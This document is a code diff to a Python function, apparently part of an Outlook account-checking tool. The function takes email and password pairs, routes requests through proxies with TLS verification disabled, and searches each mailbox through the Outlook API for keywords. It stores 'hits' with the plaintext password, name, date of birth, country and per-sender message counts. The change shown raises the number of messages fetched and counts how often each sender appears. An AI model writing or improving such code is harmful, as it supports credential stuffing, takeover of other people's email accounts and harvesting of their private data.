@@ -409,14 +409,14 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                     country = 'US'
         # ── EXTRACCIÓN REAL DE MENSAJES (GRAPH API) ──
         subject_count = "N/A"
-        senders_found = []
+        senders_found = {}
         if keyword and "jerry7822" not in keyword.lower():
             if keyword.lower().startswith('from:') or keyword.lower().startswith('subject:'):
                 query = keyword
             else:
                 query = keyword # Search generally by default
                 
-            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=5&$select=Id,From"
+            search_url = f"https://outlook.office.com/api/v2.0/me/messages?$search=%22{query}%22&$top=15&$select=Id,From"
             try:
                 sr = session.get(search_url, headers=api_headers, verify=False, timeout=15)
                 if sr.status_code == 200:
@@ -424,8 +424,8 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                     
                     for msg in data.get("value", []):
                         sender_addr = msg.get("From", {}).get("EmailAddress", {}).get("Address")
-                        if sender_addr and sender_addr not in senders_found:
-                            senders_found.append(sender_addr)
+                        if sender_addr:
+                            senders_found[sender_addr] = senders_found.get(sender_addr, 0) + 1
                             
                     subject_count = len(data.get("value", []))
                     if "@odata.count" in data:
@@ -434,13 +434,14 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
                 pass
 
         if getattr(hits_buffer, 'append', None) is not None:
+            formatted_senders = ", ".join([f"{addr} ({count})" for addr, count in senders_found.items()])
             hits_buffer.append({
                 "email": email,
                 "pass": password,
                 "domain": "outlook.com",
                 "match": keyword if keyword else "Bandeja Limpia",
                 "messages": subject_count,
-                "senders": ", ".join(senders_found) if senders_found else "N/A",
+                "senders": formatted_senders if formatted_senders else "N/A",
                 "country": country,
                 "name": name,
                 "dob": dob,
